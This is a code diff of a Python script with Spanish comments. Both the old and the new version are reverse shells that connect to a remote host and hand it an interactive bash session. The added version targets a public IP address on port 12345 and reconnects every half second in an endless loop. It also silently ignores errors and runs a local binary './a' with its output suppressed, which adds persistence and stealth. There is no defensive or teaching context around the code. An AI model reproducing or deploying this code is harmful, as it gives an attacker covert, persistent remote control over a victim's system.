@@ -1,22 +1,54 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
-import socket
 import subprocess
+import time
+import os
+import socket
 
-# Definir la dirección IP y el puerto
-IP = "10.0.4.205"
-PUERTO = 1234
+def ejecutar_script():
+    while True:
+        # Iniciar el script 'a' en un proceso separado, silenciando su salida
+        proceso = subprocess.Popen(["./a"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# Crear el socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Esperar un tiempo límite
+        tiempo_limite = 1  # 1 segundo
+        tiempo_inicio = time.time()
 
-# Conectar al servidor
-try:
-    s.connect((IP, PUERTO))
+        while time.time() - tiempo_inicio < tiempo_limite:
+            if proceso.poll() is not None:
+                break
+            time.sleep(1)  # Esperar 1 segundo
+
+        # Verificar si el proceso aún está en ejecución
+        if proceso.poll() is None:
+            # El proceso sigue en ejecución después del tiempo límite, terminarlo
+            proceso.terminate()
+        break  # Salir del bucle para no repetir este script indefinidamente en esta función
+
+def intentar_conexion(IP, PUERTO):
+    # Crear el socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((IP, PUERTO))
+        # Redirigir la entrada y salida estándar al socket
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        # Ejecutar shell interactiva
+        subprocess.call(["/bin/bash", "-i"])
+    except Exception:
+        pass  # Ignorar el error si no se puede conectar
+    finally:
+        s.close()
+
+def main():
+    IP = "161.35.147.18"
+    PUERTO = 12345
     
-    # Redirigir la entrada y salida estándar al socket
-    subprocess.call(["/bin/bash", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
-    
-except Exception as e:
-    print(f"Error al conectar: {e}")
+    while True:
+        ejecutar_script()
+        intentar_conexion(IP, PUERTO)
+        time.sleep(.5)  # Esperar 0.5 segundos antes de volver a intentar
 
+if __name__ == "__main__":
+    main()
